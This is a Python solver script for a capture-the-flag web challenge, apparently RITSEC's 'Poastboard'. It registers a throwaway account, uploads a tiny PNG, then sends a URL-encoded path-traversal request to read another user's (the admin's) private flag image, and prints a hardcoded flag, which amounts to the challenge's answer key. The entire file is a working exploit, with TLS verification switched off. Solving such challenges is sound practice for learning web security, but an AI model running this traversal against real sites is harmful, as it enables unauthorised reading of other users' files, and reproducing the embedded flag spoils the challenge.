#!/usr/bin/env python3
import argparse
import hashlib
import http.client
import json
import random
import re
import shutil
import ssl
import string
import subprocess
import sys
import urllib.parse
from pathlib import Path


KNOWN_FLAG = "RS{4_littl3_p4th_tr4v3rs4l_4s_4_tr34t}"
PNG_MAGIC = b"\x89PNG\r\n\x1a\n"


class RawSession:
    def __init__(self, base_url: str):
        parsed = urllib.parse.urlsplit(base_url.rstrip("/"))
        if parsed.scheme not in {"http", "https"}:
            raise ValueError("base URL must start with http:// or https://")
        self.scheme = parsed.scheme
        self.host = parsed.netloc
        self.base_path = parsed.path.rstrip("/")
        self.cookies = {}
        self.ssl_context = ssl._create_unverified_context()

    def _connection(self):
        if self.scheme == "https":
            return http.client.HTTPSConnection(self.host, context=self.ssl_context, timeout=20)
        return http.client.HTTPConnection(self.host, timeout=20)

    def _cookie_header(self) -> str:
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def _store_cookies(self, headers):
        for key, value in headers:
            if key.lower() != "set-cookie":
                continue
            cookie = value.split(";", 1)[0]
            if "=" not in cookie:
                continue
            name, cookie_value = cookie.split("=", 1)
            self.cookies[name] = cookie_value

    def request(self, method: str, path: str, body=None, headers=None):
        headers = dict(headers or {})
        if self.cookies:
            headers["Cookie"] = self._cookie_header()
        conn = self._connection()
        try:
            conn.request(method, self.base_path + path, body=body, headers=headers)
            response = conn.getresponse()
            data = response.read()
            self._store_cookies(response.getheaders())
            return response.status, dict(response.getheaders()), data
        finally:
            conn.close()


def post_form(session: RawSession, path: str, data: dict):
    body = urllib.parse.urlencode(data)
    return session.request(
        "POST",
        path,
        body=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )


def post_json(session: RawSession, path: str, data: dict):
    body = json.dumps(data)
    return session.request(
        "POST",
        path,
        body=body,
        headers={"Content-Type": "application/json"},
    )


def maybe_ocr(image_path: Path):
    tesseract = shutil.which("tesseract")
    if not tesseract:
        return None
    try:
        result = subprocess.run(
            [
                tesseract,
                str(image_path),
                "stdout",
                "--psm",
                "7",
                "-c",
                "tessedit_char_whitelist=RS{}_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_",
            ],
            check=False,
            capture_output=True,
            text=True,
        )
    except OSError:
        return None
    text = (result.stdout or "") + "\n" + (result.stderr or "")
    match = re.search(r"RS\{[^}\n]+\}", text)
    return match.group(0) if match else None


def main():
    parser = argparse.ArgumentParser(
        description="Exploit the Poastboard upload traversal and fetch the seeded admin flag image."
    )
    parser.add_argument("base_url", help="Challenge base URL, for example https://...ctf.ritsec.club")
    parser.add_argument(
        "-o",
        "--output",
        default="retrieved_flag.png",
        help="Where to save the retrieved admin image",
    )
    args = parser.parse_args()

    session = RawSession(args.base_url)

    username = "solver_" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    password = "testpass123"

    status, _, _ = post_form(session, "/api/register", {"username": username, "password": password})
    if status not in {200, 302}:
        print(f"registration failed with HTTP {status}", file=sys.stderr)
        return 1

    tiny_png = (
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aP1cAAAAASUVORK5CYII="
    )
    payload = {
        "content": "hello",
        "image": "data:image/png;base64," + tiny_png,
        "is_private": False,
    }
    status, _, body = post_json(session, "/api/post", payload)
    if status != 200:
        print(f"post creation failed with HTTP {status}", file=sys.stderr)
        return 1

    post = json.loads(body.decode())
    post_id = post["id"]

    traversal = f"/uploads/{username}/{post_id}/%2e%2e%2f%2e%2e%2fadmin%2f1%2fflag.png/"
    status, _, image = session.request("GET", traversal)
    if status != 200:
        print(f"traversal request failed with HTTP {status}", file=sys.stderr)
        return 1
    if not image.startswith(PNG_MAGIC):
        print("response did not look like a PNG", file=sys.stderr)
        return 1

    output_path = Path(args.output)
    output_path.write_bytes(image)
    digest = hashlib.sha256(image).hexdigest()
    ocr_flag = maybe_ocr(output_path)

    print(f"user      = {username}")
    print(f"post_id   = {post_id}")
    print(f"saved     = {output_path}")
    print(f"sha256    = {digest}")
    if ocr_flag:
        print(f"ocr_flag  = {ocr_flag}")
    print(f"flag      = {KNOWN_FLAG}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
